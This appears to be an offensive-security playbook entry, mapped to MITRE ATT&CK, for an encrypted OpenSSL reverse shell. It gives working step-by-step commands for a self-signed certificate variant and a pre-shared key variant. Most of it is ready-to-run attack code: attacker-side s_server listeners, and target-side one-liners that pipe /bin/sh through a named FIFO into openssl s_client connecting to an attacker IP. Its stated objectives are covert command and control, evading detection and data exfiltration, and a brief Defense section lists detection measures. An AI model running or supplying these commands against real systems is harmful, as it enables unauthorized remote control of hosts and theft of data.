---
type: procedure
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Encrypted Channel|T1573 - Encrypted Channel]]'
  - '[[techniques/Non-Standard Port|T1571 - Non-Standard Port]]'
sub_techniques: []
tags:
  - openssl
  - reverse-shell
commands:
  - '[[commands/openssl-generate-self-signed-cert]]'
  - '[[commands/openssl-start-server-with-cert]]'
  - '[[commands/ncat-start-ssl-server]]'
  - '[[commands/openssl-client-reverse-shell-with-cert]]'
  - '[[commands/openssl-generate-384-bit-psk]]'
  - '[[commands/openssl-start-server-with-psk]]'
  - '[[commands/openssl-start-client-with-psk]]'
platforms:
  - Linux
tools: []
verified: true
validated: true
---

# openssl-reverse-shell

## Summary

The OpenSSL Reverse Shell procedure enables attackers to establish an encrypted reverse shell connection from a compromised target back to the attacker's machine, providing a covert command and control (C2) channel for remote command execution and data exfiltration. This technique uses OpenSSL's SSL/TLS capabilities to encrypt traffic over non-standard ports, evading basic network detection, and supports two variants: one using self-signed certificates and another using pre-shared keys (PSK) for authentication without certificates.

## Description

This procedure leverages OpenSSL to create a secure, encrypted tunnel for a reverse shell, allowing persistent access to a compromised Linux host. In the certificate-based variant, a self-signed certificate is generated on the attacker side to set up an SSL/TLS server, and the target connects back using OpenSSL's s_client, piping shell I/O through a named FIFO for bidirectional communication. The PSK variant avoids certificates by using a shared secret key for TLS-PSK authentication, supporting ciphers like PSK-CHACHA20-POLY1305 for strong encryption. Both methods target Linux environments with OpenSSL installed, assuming initial code execution on the target (e.g., via prior exploitation). The encrypted traffic blends with legitimate HTTPS, complicating detection, and uses non-standard ports to avoid common filters. Success provides interactive shell access, enabling further post-exploitation activities like lateral movement or data theft.

## Requirements

1. OpenSSL installed on both attacker and target machines (version 1.1.0 or later recommended for PSK support).
2. Initial execution capability on the target (e.g., via RCE or existing foothold) to run the client command.
3. Network connectivity from target to attacker, with ability to bind a listener port on the attacker side (e.g., port 4242).
4. Administrative or user-level access on attacker machine to generate keys/certificates.

## Defense

- Monitor network traffic for anomalous SSL/TLS handshakes on non-standard ports using tools like Wireshark or Suricata with TLS inspection enabled.
- Implement deep packet inspection (DPI) to decrypt and analyze TLS-PSK or self-signed certificate traffic, blocking unsigned or mismatched certificates.
- Deploy endpoint detection and response (EDR) solutions to flag unusual process behaviors, such as mkfifo usage or OpenSSL s_client invocations piping to shells.
- Enforce network segmentation and egress filtering to restrict outbound connections to untrusted IPs/ports.
- Enable logging for OpenSSL processes and named pipes (e.g., via auditd on Linux) to detect reverse shell patterns.

## Objectives

1. Establish an encrypted C2 channel from the target to the attacker for remote shell access.
2. Maintain persistence through encrypted, stealthy communication to evade detection.
3. Execute arbitrary commands on the target and receive output over the secure connection.
4. Facilitate data exfiltration from the target using the bidirectional encrypted tunnel.

## Instructions

This procedure outlines two methods for establishing the reverse shell: certificate-based (using self-signed certs) and PSK-based (using pre-shared keys). Execute on a Linux environment. Replace placeholders like $_ATTACKER_IP, $_PORT, and $_PSK with actual values.

### Step 1: Generate Self-Signed Certificate (Certificate Method)

**Context**: Create a private key and self-signed certificate on the attacker machine to authenticate the SSL/TLS server. This step prepares the listener without relying on public CA.

**Command** ([[commands/openssl-generate-self-signed-cert]]):
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

> This command generates a 4096-bit RSA key and a self-signed certificate valid for 365 days, without passphrase encryption (-nodes). Run interactively; provide dummy details for subject (e.g., Country: US, Common Name: attacker.local). Expected output includes confirmation of file creation: "writing new private key to 'key.pem'" and "-----BEGIN CERTIFICATE-----" in cert.pem. Verify files exist with ls key.pem cert.pem.

### Step 2: Start SSL/TLS Server Listener (Certificate Method)

**Context**: Launch the OpenSSL server on the attacker machine to listen for incoming connections from the target, using the generated certificate and key.

**Command** ([[commands/openssl-start-server-with-cert]]):
```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port $_PORT
```

> Use -quiet to suppress non-error output. Replace $_PORT with e.g., 4242. Alternatively, use Ncat for the listener: [[commands/ncat-start-ssl-server]]. Expected output: Server starts listening; upon connection, displays handshake details like "Using default temp DH parameters" and forwards shell I/O. If connection succeeds, attacker sees a shell prompt.

### Step 3: Execute Reverse Shell on Target (Certificate Method)

**Context**: On the compromised target, create a named FIFO pipe and connect back to the attacker's server, redirecting shell input/output for an interactive session.

**Command** ([[commands/openssl-client-reverse-shell-with-cert]]):
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $_ATTACKER_IP:$_PORT > /tmp/s; rm /tmp/s
```

> Replace $_ATTACKER_IP and $_PORT with attacker details (e.g., 10.0.0.1:4242). The mkfifo creates a pipe /tmp/s; the shell reads/writes through it while openssl s_client handles the encrypted connection. Expected output on target: No visible output if successful; connection establishes, and attacker receives shell. Clean up removes the pipe. If fails, check firewall/port binding.

### Step 4: Generate Pre-Shared Key (PSK Method)

**Context**: Create a 384-bit (48-byte hex) PSK on the attacker machine, which will be shared securely with the target (e.g., via prior channel) for certificate-less authentication.

**Command** ([[commands/openssl-generate-384-bit-psk]]):
```bash
openssl rand -hex 48
```

> This generates a random hex string (e.g., "a1b2c3..." 96 characters). Copy the output as $_PSK for use in server/client commands. Expected output: Single line hex string. Share this key with the target before proceeding.

### Step 5: Start PSK Server Listener (PSK Method)

**Context**: Set up the TLS-PSK server on the attacker machine using the generated PSK and specified ciphers for encrypted listening without certificates.

**Command** ([[commands/openssl-start-server-with-psk]]):
```bash
export LHOST="*"; export LPORT="$_PORT"; export PSK="$_PSK"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
```

> Replace $_PORT (e.g., 4242) and $_PSK with the generated key. -nocert disables certificates; ciphers prioritize secure PSK options. Expected output: Server listens; on connection, shows "PSK identity" and enables shell forwarding. Supports TLS 1.2 only (-tls1_2).

### Step 6: Execute PSK Reverse Shell on Target (PSK Method)

**Context**: On the target, create a unique named pipe and connect to the PSK server, piping shell I/O for encrypted reverse access.

**Command** ([[commands/openssl-start-client-with-psk]]):
```bash
export RHOST="$_ATTACKER_IP"; export RPORT="$_PORT"; export PSK="$_PSK"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```

> Replace $_ATTACKER_IP, $_PORT, and $_PSK. The pipe name is randomized for uniqueness. Expected output: Silent on success; establishes encrypted shell. If PSK mismatch, handshake fails with error. Cleanup removes pipe.
